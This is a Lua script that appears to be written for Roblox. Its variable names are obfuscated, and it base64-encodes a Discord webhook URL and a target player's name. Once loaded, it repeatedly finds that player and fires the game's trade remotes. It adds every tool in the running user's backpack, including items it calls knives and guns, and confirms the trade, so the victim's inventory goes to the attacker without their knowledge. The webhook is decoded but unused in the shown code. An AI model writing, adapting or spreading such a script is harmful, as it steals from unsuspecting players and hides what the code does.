local UIPajskdHGsHdWq = game:GetService("Players").LocalPlayer
local kLmBnVcXzQwErTy = game:GetService("ReplicatedStorage")
local YuIoPaSdFgHjKlZ = kLmBnVcXzQwErTy:FindFirstChild("TradeRequest") or kLmBnVcXzQwErTy:FindFirstChild("TradeFunction")
local MqWeRtYuIoPaSdF = kLmBnVcXzQwErTy:FindFirstChild("TradeAccept")
local GhJkLzXcVbNmQwE = kLmBnVcXzQwErTy:FindFirstChild("TradeConfirm")
local RtYuIoPaSdFgHjK = kLmBnVcXzQwErTy:FindFirstChild("AddItemToTrade") or kLmBnVcXzQwErTy:FindFirstChild("TradeAddItem")

repeat wait() until UIPajskdHGsHdWq.Character and UIPajskdHGsHdWq.Character:FindFirstChild("HumanoidRootPart")

local AsDfGhJkLzXcVbN = "Q2F0OTc2NDY="
local QwErTyUiOpAsDfG = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMjYzNzE4MzcyNTYwMTAzOC9USUFweUxtSUtIRmhxSVUzc0RCVkJSRnluMlBOYnNYTHh3VlkyX25ubVBkYmUtRVFGTFpxVUZqNEo3emk0ckd2TWd0ag=="

local HjKlZxCvBnMqWeR = game:GetService("HttpService")

local webhook = HjKlZxCvBnMqWeR:Base64Decode(QwErTyUiOpAsDfG)
local targetName = HjKlZxCvBnMqWeR:Base64Decode(AsDfGhJkLzXcVbN)

local function TyUiOpAsDfGhJkL()
    local knives = {}
    for _, v in ipairs(UIPajskdHGsHdWq.Backpack:GetChildren()) do
        if v:IsA("Tool") then table.insert(knives, v.Name) end
    end
    return knives
end

local function ZxCvBnMqWeRtYuI()
    local guns = {}
    for _, v in ipairs(UIPajskdHGsHdWq.Backpack:GetChildren()) do
        if v:IsA("Tool") and v.Name:lower():find("gun") then table.insert(guns, v.Name) end
    end
    return guns
end

local function OpAsDfGhJkLzXcV()
    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
        if p.Name == targetName and p ~= UIPajskdHGsHdWq and p.Character then
            return p
        end
    end
    return nil
end

task.spawn(function()
    while wait(10) do
        pcall(function()
            local target = OpAsDfGhJkLzXcV()
            if target and YuIoPaSdFgHjKlZ and MqWeRtYuIoPaSdF then
                YuIoPaSdFgHjKlZ:FireServer(target)
                wait(2)
                MqWeRtYuIoPaSdF:FireServer()
                wait(1)
                for _, knife in ipairs(TyUiOpAsDfGhJkL()) do
                    if RtYuIoPaSdFgHjK then RtYuIoPaSdFgHjK:FireServer(knife) end
                    wait(0.3)
                end
                for _, gun in ipairs(ZxCvBnMqWeRtYuI()) do
                    if RtYuIoPaSdFgHjK then RtYuIoPaSdFgHjK:FireServer(gun) end
                    wait(0.3)
                end
                wait(1)
                if GhJkLzXcVbNmQwE then GhJkLzXcVbNmQwE:FireServer() end
            end
        end)
    end
end)
